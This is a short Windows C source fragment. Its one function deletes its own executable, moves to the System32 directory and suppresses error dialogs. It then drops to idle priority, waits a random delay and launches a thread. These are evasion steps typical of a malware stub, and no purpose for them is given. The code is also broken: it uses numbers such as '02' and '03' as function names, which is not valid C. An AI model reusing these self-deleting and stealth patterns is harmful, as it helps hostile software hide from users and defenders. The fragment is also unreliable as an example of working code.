#include "01.h"
#include "02.h"
#include "03.h"
void 02() {
    HANDLE h = GetCurrentProcess();
    DWORD p = GetCurrentProcessId();
    wchar_t n[MAX_PATH];
    GetModuleFileName(NULL, n, MAX_PATH);
    DeleteFile(n);
    SetCurrentDirectory(L"C:\\Windows\\System32");
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
    SetPriorityClass(h, IDLE_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);
    Sleep(5000 + (rand() % 3000));
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)03, NULL, 0, NULL);
    CloseHandle(t);
}
